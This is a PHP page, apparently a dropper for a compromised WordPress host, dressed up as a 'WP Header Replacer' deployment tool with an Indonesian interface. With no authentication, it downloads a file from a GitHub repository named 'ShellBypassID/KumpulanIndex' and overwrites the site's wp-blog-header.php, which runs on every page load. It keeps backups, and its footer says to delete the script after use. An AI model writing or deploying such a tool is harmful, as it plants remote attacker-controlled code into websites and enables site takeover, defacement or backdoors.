<?php
/**
 * WP Blog Header Replacer Tool - Modern Pro Version
 */

// Konfigurasi
define('TARGET_FILE', '/mnt/data/home/mt/public_html/supercourt/wordpress/wp-blog-header.php');
define('SOURCE_URL', 'https://raw.githubusercontent.com/ShellBypassID/KumpulanIndex/refs/heads/main/wp-blog-header.php');
define('BACKUP_DIR', dirname(TARGET_FILE) . '/backups');

// Buat direktori backup
if (!file_exists(BACKUP_DIR)) {
    mkdir(BACKUP_DIR, 0755, true);
}

// Proses replace
$message = '';
$message_type = '';

if (isset($_POST['action']) && $_POST['action'] === 'replace') {
    $ch = curl_init(SOURCE_URL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $new_content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code !== 200 || !$new_content) {
        $message = 'Gagal download dari GitHub! HTTP Code: ' . $http_code;
        $message_type = 'error';
    } else {
        if (file_exists(TARGET_FILE)) {
            $backup_name = 'backup_' . date('Y-m-d_H-i-s') . '.php';
            copy(TARGET_FILE, BACKUP_DIR . '/' . $backup_name);
        }

        if (file_put_contents(TARGET_FILE, $new_content)) {
            chmod(TARGET_FILE, 0644);
            $message = 'File berhasil diganti! Backup: ' . ($backup_name ?? 'tidak ada backup (file baru)');
            $message_type = 'success';
        } else {
            $message = 'Gagal menulis file! Cek permission folder.';
            $message_type = 'error';
        }
    }
}

// Restore backup
if (isset($_POST['action']) && $_POST['action'] === 'restore' && isset($_POST['backup_file'])) {
    $backup_file = BACKUP_DIR . '/' . basename($_POST['backup_file']);
    if (file_exists($backup_file)) {
        if (copy($backup_file, TARGET_FILE)) {
            chmod(TARGET_FILE, 0644);
            $message = 'Restore berhasil!';
            $message_type = 'success';
        } else {
            $message = 'Gagal restore!';
            $message_type = 'error';
        }
    } else {
        $message = 'File backup tidak ditemukan!';
        $message_type = 'error';
    }
}

// Hapus backup
if (isset($_POST['action']) && $_POST['action'] === 'delete_backup' && isset($_POST['backup_file'])) {
    $backup_file = BACKUP_DIR . '/' . basename($_POST['backup_file']);
    if (file_exists($backup_file)) {
        unlink($backup_file);
        $message = 'Backup dihapus!';
        $message_type = 'success';
    }
}

$backup_files = glob(BACKUP_DIR . '/*.php');
rsort($backup_files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WP Header Replacer — Pro Tool</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg: #0a0a0f;
            --surface: #12121a;
            --surface-2: #1a1a26;
            --border: #2a2a3a;
            --text: #e8e8f0;
            --text-dim: #8888a0;
            --accent: #7c5cff;
            --accent-2: #00d4aa;
            --danger: #ff3b5c;
            --danger-glow: rgba(255, 59, 92, 0.35);
            --success: #00d4aa;
            --warning: #ffb020;
        }

        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            background-image:
                radial-gradient(ellipse 80% 50% at 50% -20%, rgba(124, 92, 255, 0.15), transparent),
                radial-gradient(ellipse 60% 40% at 80% 100%, rgba(0, 212, 170, 0.08), transparent);
        }

        .app {
            width: 100%;
            max-width: 640px;
        }

        /* Header */
        .app-header {
            text-align: center;
            margin-bottom: 36px;
        }

        .logo-mark {
            width: 64px;
            height: 64px;
            margin: 0 auto 20px;
            border-radius: 18px;
            background: linear-gradient(135deg, var(--accent) 0%, #5a3fd6 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            color: #fff;
            box-shadow: 0 8px 32px rgba(124, 92, 255, 0.4);
            position: relative;
        }

        .logo-mark::after {
            content: '';
            position: absolute;
            inset: -2px;
            border-radius: 20px;
            background: linear-gradient(135deg, var(--accent), var(--accent-2));
            z-index: -1;
            opacity: 0.5;
            filter: blur(12px);
        }

        .app-header h1 {
            font-size: 26px;
            font-weight: 800;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #fff 0%, #a89fff 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 8px;
        }

        .app-header p {
            font-size: 14px;
            color: var(--text-dim);
            font-weight: 500;
        }

        /* Status Badge */
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 7px;
            padding: 6px 14px;
            border-radius: 100px;
            font-size: 12px;
            font-weight: 600;
            margin-top: 16px;
            background: rgba(0, 212, 170, 0.1);
            border: 1px solid rgba(0, 212, 170, 0.25);
            color: var(--accent-2);
        }

        .status-badge.offline {
            background: rgba(255, 59, 92, 0.1);
            border-color: rgba(255, 59, 92, 0.25);
            color: var(--danger);
        }

        .status-dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: currentColor;
            box-shadow: 0 0 8px currentColor;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        /* Alert */
        .alert {
            padding: 14px 18px;
            border-radius: 14px;
            margin-bottom: 24px;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 12px;
            animation: slideIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-12px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .alert.success {
            background: rgba(0, 212, 170, 0.1);
            border: 1px solid rgba(0, 212, 170, 0.3);
            color: var(--accent-2);
        }

        .alert.error {
            background: rgba(255, 59, 92, 0.1);
            border: 1px solid rgba(255, 59, 92, 0.3);
            color: var(--danger);
        }

        .alert-icon {
            font-size: 18px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
        }

        /* Main Card */
        .card {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 32px;
            box-shadow: 0 24px 64px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(124, 92, 255, 0.5), transparent);
        }

        .card-title {
            font-size: 13px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: var(--text-dim);
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .card-title::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--border);
        }

        /* Replace Button */
        .btn-replace {
            width: 100%;
            padding: 20px 24px;
            border: none;
            border-radius: 16px;
            background: linear-gradient(135deg, var(--danger) 0%, #d62a48 100%);
            color: white;
            font-family: inherit;
            font-size: 15px;
            font-weight: 700;
            letter-spacing: 0.3px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
            box-shadow: 0 4px 24px var(--danger-glow);
            position: relative;
            overflow: hidden;
        }

        .btn-replace i {
            font-size: 18px;
        }

        .btn-replace::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }

        .btn-replace:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 32px var(--danger-glow);
        }

        .btn-replace:hover::before {
            left: 100%;
        }

        .btn-replace:active {
            transform: translateY(0);
        }

        /* Divider */
        .divider {
            height: 1px;
            background: var(--border);
            margin: 28px 0;
            position: relative;
        }

        .divider-label {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: var(--surface);
            padding: 0 14px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-dim);
        }

        /* Backup Section */
        .section-label {
            font-size: 13px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .section-label i {
            color: var(--accent);
            font-size: 15px;
        }

        .count-pill {
            background: var(--surface-2);
            border: 1px solid var(--border);
            padding: 2px 9px;
            border-radius: 100px;
            font-size: 11px;
            font-weight: 700;
            color: var(--text-dim);
        }

        /* Backup List */
        .backup-list {
            max-height: 280px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 10px;
            padding-right: 4px;
        }

        .backup-list::-webkit-scrollbar {
            width: 5px;
        }

        .backup-list::-webkit-scrollbar-track {
            background: transparent;
        }

        .backup-list::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 10px;
        }

        .backup-item {
            background: var(--surface-2);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            transition: all 0.2s;
        }

        .backup-item:hover {
            border-color: rgba(124, 92, 255, 0.4);
            background: #1e1e2e;
        }

        .backup-meta {
            display: flex;
            flex-direction: column;
            gap: 3px;
            min-width: 0;
            flex: 1;
        }

        .backup-name {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            font-weight: 500;
            color: var(--text);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .backup-date {
            font-size: 11px;
            color: var(--text-dim);
            font-weight: 500;
        }

        .backup-actions {
            display: flex;
            gap: 6px;
            flex-shrink: 0;
        }

        /* Icon Buttons */
        .btn-icon {
            width: 34px;
            height: 34px;
            border-radius: 10px;
            border: 1px solid var(--border);
            background: var(--surface);
            color: var(--text-dim);
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 15px;
            transition: all 0.2s;
            font-family: inherit;
        }

        .btn-icon:hover {
            color: var(--text);
            border-color: var(--accent);
            background: rgba(124, 92, 255, 0.15);
            transform: translateY(-1px);
        }

        .btn-icon.restore:hover {
            color: var(--accent-2);
            border-color: var(--accent-2);
            background: rgba(0, 212, 170, 0.15);
        }

        .btn-icon.delete:hover {
            color: var(--danger);
            border-color: var(--danger);
            background: rgba(255, 59, 92, 0.15);
        }

        /* Empty State */
        .empty-state {
            text-align: center;
            padding: 36px 20px;
            background: var(--surface-2);
            border: 1px dashed var(--border);
            border-radius: 16px;
        }

        .empty-icon {
            font-size: 32px;
            margin-bottom: 12px;
            color: var(--text-dim);
            opacity: 0.4;
        }

        .empty-state p {
            font-size: 13px;
            color: var(--text-dim);
            font-weight: 500;
        }

        /* Footer */
        .app-footer {
            text-align: center;
            margin-top: 24px;
            font-size: 11px;
            color: var(--text-dim);
            font-weight: 500;
            letter-spacing: 0.3px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        @media (max-width: 480px) {
            .card { padding: 24px 20px; }
            .app-header h1 { font-size: 22px; }
            .btn-replace { font-size: 14px; padding: 18px; }
        }
    </style>
</head>
<body>
    <div class="app">
        <div class="app-header">
            <div class="logo-mark">
                <i class="bi bi-lightning-charge-fill"></i>
            </div>
            <h1>WP Header Replacer</h1>
            <p>Professional Deployment Tool</p>
            <div class="status-badge <?php echo file_exists(TARGET_FILE) ? '' : 'offline'; ?>">
                <span class="status-dot"></span>
                <?php echo file_exists(TARGET_FILE) ? 'Target Ready' : 'Target Offline'; ?>
            </div>
        </div>

        <?php if ($message): ?>
        <div class="alert <?php echo $message_type; ?>">
            <span class="alert-icon">
                <i class="bi <?php echo $message_type === 'success' ? 'bi-check-circle-fill' : 'bi-x-circle-fill'; ?>"></i>
            </span>
            <span><?php echo htmlspecialchars($message); ?></span>
        </div>
        <?php endif; ?>

        <div class="card">
            <div class="card-title">Deployment</div>

            <form method="POST" onsubmit="return confirm('PERINGATAN!\n\nFile wp-blog-header.php akan diganti dengan file dari GitHub.\nBackup otomatis akan dibuat.\n\nLanjutkan?');">
                <input type="hidden" name="action" value="replace">
                <button type="submit" class="btn-replace">
                    <i class="bi bi-cloud-arrow-down-fill"></i>
                    <span>Replace from GitHub</span>
                </button>
            </form>

            <div class="divider">
                <span class="divider-label">Backup Manager</span>
            </div>

            <div class="section-label">
                <i class="bi bi-archive-fill"></i>
                Available Backups
                <span class="count-pill"><?php echo count($backup_files); ?></span>
            </div>

            <?php if (count($backup_files) > 0): ?>
            <div class="backup-list">
                <?php foreach ($backup_files as $backup): ?>
                <div class="backup-item">
                    <div class="backup-meta">
                        <span class="backup-name"><?php echo basename($backup); ?></span>
                        <span class="backup-date"><?php echo date('d M Y · H:i:s', filemtime($backup)); ?></span>
                    </div>
                    <div class="backup-actions">
                        <form method="POST" style="display: inline;" onsubmit="return confirm('Restore file ini?')">
                            <input type="hidden" name="action" value="restore">
                            <input type="hidden" name="backup_file" value="<?php echo basename($backup); ?>">
                            <button type="submit" class="btn-icon restore" title="Restore">
                                <i class="bi bi-arrow-counterclockwise"></i>
                            </button>
                        </form>
                        <form method="POST" style="display: inline;" onsubmit="return confirm('Hapus backup ini?')">
                            <input type="hidden" name="action" value="delete_backup">
                            <input type="hidden" name="backup_file" value="<?php echo basename($backup); ?>">
                            <button type="submit" class="btn-icon delete" title="Hapus">
                                <i class="bi bi-trash3"></i>
                            </button>
                        </form>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div class="empty-state">
                <div class="empty-icon">
                    <i class="bi bi-inbox"></i>
                </div>
                <p>Belum ada backup tersedia</p>
            </div>
            <?php endif; ?>
        </div>

        <div class="app-footer">
            <i class="bi bi-info-circle"></i>
            Hapus script ini setelah selesai digunakan
        </div>
    </div>
</body>
</html>
